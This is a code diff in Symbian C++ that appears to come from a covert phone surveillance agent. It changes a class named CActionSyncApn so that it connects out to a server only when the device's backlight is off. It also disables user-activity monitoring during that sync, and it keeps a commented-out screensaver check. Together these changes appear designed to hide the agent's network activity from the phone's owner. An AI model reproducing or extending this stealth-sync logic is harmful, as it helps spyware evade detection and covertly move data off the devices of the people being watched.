@@ -7,6 +7,8 @@
 
 #include "ActionSyncApn.h"
 
+#include <HT\Processes.h>
+
 #include <es_enum.h>     // for TConnectionInfoBuf
 #include <rconnmon.h>	 // for connection monitor, add connmon.lib
 
@@ -183,9 +185,27 @@ void CActionSyncApn::DispatchStartCommandL()
 	//value = 0; // TODO: comment this when done
 	if (value == 1)
 		{
-		// display is active.... next time
-		MarkCommandAsDispatchedL();
-		return;
+		//we check if screensaver is on
+		/*
+		if(!Processes::IsScreensaverRunning())
+			{
+			__FLOG(_L("Display active"));
+					
+			// display is active.... next time
+			MarkCommandAsDispatchedL();
+			return;
+			}
+			*/
+		//we check backlight status
+		TInt backlightState;
+		HAL::Get( HALData::EBacklightState, backlightState );
+		if(backlightState==1)
+			{
+			//backlight is active... next time
+			MarkCommandAsDispatchedL();
+			return;
+			}
+					
 		}
 		
 	// create the access point
@@ -224,10 +244,11 @@ void CActionSyncApn::DispatchStartCommandL()
 		return;
 		}
 	
+	//TODO: monitoring of user activity has been disabled, we had problems on older devices when dropping down gprs syncs
 	// start sync.... at last! and monitor user activity
-	//iProtocol->ConnectToServerL( ETrue, iSocketServ, iConnection, iHostName, 80 );
-	iProtocol->StartRestProtocolL( ETrue, iSocketServ, iConnection, iHostName, 80 );
-		
+	//iProtocol->StartRestProtocolL( ETrue, iSocketServ, iConnection, iHostName, 80 );
+	iProtocol->StartRestProtocolL( EFalse, iSocketServ, iConnection, iHostName, 80 );
+			
 	}
 
 
